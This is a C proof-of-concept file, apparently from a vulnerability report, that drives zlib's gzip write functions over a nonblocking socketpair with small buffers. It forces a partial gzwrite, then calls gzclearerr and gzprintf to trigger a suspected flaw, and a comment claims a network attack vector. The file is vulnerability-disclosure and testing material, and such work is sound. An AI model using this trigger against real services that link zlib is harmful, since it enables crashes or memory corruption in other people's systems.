/* poc_socket.c — socket-based; confirms AV:N via socketpair with SO_RCVBUF=4096 */
#define _GNU_SOURCE
#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include "zlib.h"

#define WRITE_SIZE (1024 * 1024)

static void drain(int fd) {
    char tmp[65536]; ssize_t r;
    while ((r = read(fd, tmp, sizeof tmp)) > 0);
}

int main(void) {
    unsigned char *big_buf = malloc(WRITE_SIZE);
    assert(big_buf);
    for (size_t i = 0; i < WRITE_SIZE; i++) big_buf[i] = (unsigned char)rand();

    int sv[2];
    socketpair(AF_UNIX, SOCK_STREAM, 0, sv);
    int rcvbuf = 4096;
    setsockopt(sv[0], SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof rcvbuf);
    setsockopt(sv[1], SOL_SOCKET, SO_SNDBUF, &rcvbuf, sizeof rcvbuf);
    fcntl(sv[1], F_SETFL, O_NONBLOCK);
    fcntl(sv[0], F_SETFL, O_NONBLOCK);

    gzFile gz = gzdopen(sv[1], "wb");
    assert(gz);
    { unsigned char probe = 0x42;
      gzwrite(gz, &probe, 1);
      gzflush(gz, Z_SYNC_FLUSH);
      drain(sv[0]); }

    char fill[4096]; memset(fill, 0x55, sizeof fill);
    while (write(sv[1], fill, sizeof fill) == (ssize_t)sizeof fill);

    int ws = gzwrite(gz, big_buf, WRITE_SIZE);
    assert(ws < WRITE_SIZE);
    drain(sv[0]);
    gzclearerr(gz);
    gzprintf(gz, "x");

    free(big_buf); gzclose(gz); close(sv[0]);
    return 0;
}
